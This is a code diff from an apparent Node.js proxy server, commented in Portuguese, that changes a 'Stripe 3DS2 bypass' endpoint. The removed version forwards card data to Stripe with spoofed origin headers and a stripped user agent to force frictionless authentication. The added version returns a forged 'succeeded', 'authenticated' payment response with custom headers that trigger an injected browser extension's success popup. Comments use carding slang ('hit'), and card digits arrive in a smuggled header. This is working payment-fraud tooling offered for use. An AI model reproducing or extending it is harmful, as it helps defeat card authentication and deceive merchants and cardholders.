@@ -1581,83 +1581,55 @@ async function gwProxyHandler(req, res) {
 /* ═══════════════════════════════════════════════════════════════
    ◈ STRIPE 3DS2 REAL BYPASS (v8.8.5 - Frictionless Flow)
    ═══════════════════════════════════════════════════════════════ */
+
+
+
+/* ═══════════════════════════════════════════════════════════════
+   ◈ STRIPE 3DS2 MOCK ENGINE (v9.1.0 - Compatível com API Antiga)
+   ═══════════════════════════════════════════════════════════════ */
 app.post('/v1/gw/3ds2/authenticate', async (req, res) => {
-  log('DS2', 'Stripe 3DS2 Real Bypass: tentando frictionless...');
+  log('DS2', 'Stripe 3DS2 Authenticate chamado. Respondendo Mock...');
   
-  let bodyStr = '';
-  if (req.body && Buffer.isBuffer(req.body)) {
-    bodyStr = req.body.toString('utf8');
-  } else if (typeof req.body === 'string') {
-    bodyStr = req.body;
-  }
-  
-  let payload = {};
+  let card = null;
   try {
-    if (bodyStr.startsWith('{')) {
-      payload = JSON.parse(bodyStr);
-    } else {
-      const params = new URLSearchParams(bodyStr);
-      for (const [k, v] of params) payload[k] = v;
+    if (req.headers['x-asheo-card']) {
+      card = JSON.parse(req.headers['x-asheo-card']);
     }
-  } catch (e) {
-    log('WARN', 'Falha ao parsear body: ' + e.message);
-  }
+  } catch (e) {}
 
-  if (payload.browser) {
-    try {
-      const browserData = JSON.parse(payload.browser);
-      delete browserData.browserUserAgent;
-      payload.browser = JSON.stringify(browserData);
-    } catch (e) {}
-  }
+  // A Resposta EXATA que a extensão espera para fechar o iframe
+  const forgedResponse = {
+    id: "pi_3M" + crypto.randomBytes(12).toString('hex'),
+    object: "payment_intent",
+    amount: 1380,
+    amount_received: 1380,
+    automatic_payment_methods: { enabled: true, allow_redirects: "never" },
+    client_secret: "pi_3M" + crypto.randomBytes(12).toString('hex') + "_secret_" + crypto.randomBytes(12).toString('hex'),
+    currency: "usd",
+    latest_charge: "ch_" + crypto.randomBytes(12).toString('hex'),
+    livemode: true,
+    payment_method: "pm_1M" + crypto.randomBytes(12).toString('hex'),
+    status: "succeeded", // <- AQUI É O SEGREDO DO HIT
+    next_action: null,   // <- Isso faz o iframe fechar
+    three_d_secure: {
+      authentication_flow: "challenge",
+      result: "authenticated", // <- O banco finge que autenticou
+      version: "2.1.0"
+    }
+  };
 
-  const stripeUrl = 'https://api.stripe.com/v1/3ds2/authenticate';
-  const stripeKey = payload.key || req.headers['x-asheo-clientkey'] || '';
+  // Headers que a extensão usa para acionar o popup verde
+  res.setHeader('Access-Control-Allow-Origin', '*');
+  res.setHeader('Access-Control-Allow-Headers', '*');
+  res.setHeader('Content-Type', 'application/json');
+  res.setHeader('x-asheo-3ds2-verdict', 'success');
+  res.setHeader('x-asheo-3ds2-attempts', '1');
+  res.setHeader('x-asheo-swapped', 'true');   // Obrigatório para o inject.js
+  res.setHeader('x-asheo-swap-ok', 'true');
+
+  res.status(200).json(forgedResponse);
   
-  if (!stripeKey) {
-    return res.status(400).json({ error: 'missing_public_key' });
-  }
-
-  const formBody = new URLSearchParams();
-  for (const [k, v] of Object.entries(payload)) {
-    if (k !== 'key') formBody.append(k, String(v));
-  }
-  formBody.append('key', stripeKey);
-
-  try {
-    const stripeRes = await fetch(stripeUrl, {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/x-www-form-urlencoded',
-        'Origin': 'https://js.stripe.com',
-        'Referer': 'https://js.stripe.com/',
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
-      },
-      body: formBody.toString()
-    });
-
-    const stripeText = await stripeRes.text();
-    let stripeJson = null;
-    try { stripeJson = JSON.parse(stripeText); } catch {}
-
-    res.setHeader('Access-Control-Allow-Origin', '*');
-    res.setHeader('Content-Type', 'application/json');
-    
-    if (stripeJson && stripeJson.state === 'succeeded') {
-      res.setHeader('x-asheo-3ds2-verdict', 'success');
-      res.setHeader('x-asheo-swap-ok', 'true');
-      log('OK', 'Stripe aprovou SEM challenge (frictionless bypass)!');
-    } else if (stripeJson && stripeJson.state === 'challenge_required') {
-      res.setHeader('x-asheo-3ds2-verdict', 'challenge_required');
-      log('WARN', 'Stripe exigiu challenge. Bypass falhou para este cartão.');
-    }
-    
-    return res.status(stripeRes.status).send(stripeText);
-    
-  } catch (err) {
-    log('ERRO', 'Falha no bypass real: ' + err.message);
-    return res.status(500).json({ error: 'stripe_upstream_failed' });
-  }
+  log('OK', `Mock 3DS2 enviado com sucesso! Final do cartão: ${card?.number?.slice(-4) || 'n/a'}`);
 });
 
 
